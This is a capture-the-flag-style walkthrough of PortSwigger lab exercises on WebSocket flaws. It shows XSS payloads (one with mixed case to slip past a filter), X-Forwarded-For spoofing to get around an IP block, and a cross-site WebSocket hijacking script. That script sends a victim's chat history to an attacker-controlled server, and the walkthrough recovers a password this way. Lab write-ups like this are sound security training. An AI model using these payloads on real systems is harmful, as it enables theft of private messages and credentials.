**Manipulating WebSocket messages to exploit vulnerabilities**

From <https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities> 


Intercepting message from live box 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/48cdf6c7-c4ef-4363-9095-297e9dffdca8)


Entering < or > will url encode it 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9b9c7e4a-9550-4557-9c14-37c291e480cb)



Trigger an alert 
```
<img src=1 onerror='alert(1)'>
```

From <https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/55c6c7c8-983f-4736-960c-2a2f1ea5c2fa)




Forward request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6d293672-7691-4562-be16-4a702cfcf0fa)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/84f121f3-e3f1-4b13-ba73-60ecdfeff12b)



**Cross-site WebSocket hijacking**

From <https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab> 



request has no CSRF tokens.
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fd6733f7-16ce-489e-95e9-20fb4e7b6541)

From <https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab> 



Copy url
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/dbc5daea-8a8f-47cf-be1a-46f94fdbf413)


On our exploit server paste in body

```
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

Above for collaborator
Below is for burpesuite free

```
<script>
var ws = new WebSocket(
    "wss://0a62003103113568801d043300c000df.web-security-academy.net/chat"
);
ws.onopen = function (){
    ws.send("READY");
};
ws.onmessage = function (event) {
    fetch(
        "https://exploit-0ac1002b030b35dc800d036501600065.exploit-server.net/exploit?message=" +
            btoa(event.data)
    );
};
</script>
```

Replace with parameter

```
https://0a62003103113568801d043300c000df.web-security-academy.net/chat
https://exploit-0ac1002b030b35dc800d036501600065.exploit-server.net/
```


We got chat history
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6cadc74c-faff-4e0e-b053-df9fdb5d11d9)


Base64 decode
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9984df97-2e8c-445c-bc83-c8ff7aad211c)

Password found


**Manipulating the WebSocket handshake to exploit vulnerabilities**

From <https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities> 


Live chat block xss
```
<img src=1 onerror='alert(1)'>
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0017f795-8aac-40c6-84e5-5f6f71ccd518)

From <https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities> 




We been blacklisted
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/79f81317-cd3b-44ef-8514-f2cd3116c7c1)




X-Forwarded-For: 1.1.1.1
To bypass blacklist
Forward on Proxy intercept
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d7add765-7753-41cb-9ce8-e37679808f00)



```
X-Forwarded-For: 1.1.1.1 or 127.0.0.1
```

```
<img src=1 oNeRrOr=alert`1`>
```

From <https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities> 


Go to websocket
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4fc2fa57-8426-47e5-9047-86eafd83dafd)


Send to repeater
Reconnect with 
```
X-Forwarded-For: 127.0.0.1
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5497e7b7-f96c-4338-89ea-101338881c2b)

```
"message":"<img src=1 oNeRrOr=alert`1`>"
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/55ce3870-a6d1-4942-9c91-042a87294693)











